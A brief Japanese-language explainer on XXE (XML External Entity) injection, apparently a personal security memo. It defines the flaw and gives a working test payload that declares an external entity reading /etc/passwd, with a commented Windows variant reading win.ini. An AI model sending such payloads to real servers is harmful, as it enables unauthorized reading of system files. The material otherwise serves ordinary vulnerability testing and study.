# XXEとは
XXE（XML External Entity）とは、XMLを処理するアプリケーションの脆弱性を悪用する。  
攻撃者は外部エンティティを参照する不正なXMLデータを送り込み、様々な問題を引き起こす。  
外部エンティティを読み込む機能を有効化していると起きる。

## 確認方法
```bash
<!DOCTYPE foo [
  <!ENTITY payload SYSTEM "/etc/passwd"> # <!ENTITY payload SYSTEM "file:///C:/Windows/win.ini"> Windowsの場合
]>
<data>
  &payload;
</data>
```
